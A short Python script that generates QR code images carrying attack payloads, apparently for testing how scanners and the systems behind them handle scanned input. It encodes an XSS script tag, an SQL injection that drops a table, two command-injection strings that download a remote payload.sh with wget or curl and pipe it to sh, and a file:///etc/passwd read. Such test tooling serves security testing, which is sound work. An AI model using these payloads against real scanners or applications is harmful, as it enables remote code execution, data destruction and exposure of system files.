import qrcode

def generate_qr(payload, filename, description):
    qr = qrcode.QRCode(
        version=None,
        error_correction=qrcode.constants.ERROR_CORRECT_M,
        box_size=10,
        border=4,
    )
    qr.add_data(payload)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)
    print(f"Saved QR code with {description} as {filename}")

# XSS payload
xss_payload = "<script>alert('XSS!');</script>"
generate_qr(xss_payload, "qr_xss.png", "XSS payload")

# SQL injection payload
sql_payload = "'; DROP TABLE logs;-- "
generate_qr(sql_payload, "qr_sql_injection.png", "SQL-injection payload")

# Command injection payload using wget/curl
cmd_payload = "`; wget https://www.botvrij.eu/payload.sh -O- | sh; #`"
generate_qr(cmd_payload, "qr_cmd_injection_wget.png", "Command injection payload wget")

# Command injection payload using curl
cmd_payload_curl = "`; curl -s https://www.botvrij.eu/payload.sh | sh; #`"
generate_qr(cmd_payload_curl, "qr_cmd_injection_curl.png", "Command injection payload curl")

# File inclusion payload
file_inclusion_payload = "file:///etc/passwd"
generate_qr(file_inclusion_payload, "qr_file_inclusion.png", "File inclusion payload")

# Email payload
email_payload = "mailto:info@botvrij.eu?subject=Test&body=QR"
generate_qr(email_payload, "qr_email.png", "Email payload")

# URL payload
url_payload = "https://www.botvrij.eu/payload-test"
generate_qr(url_payload, "qr_url.png", "URL payload")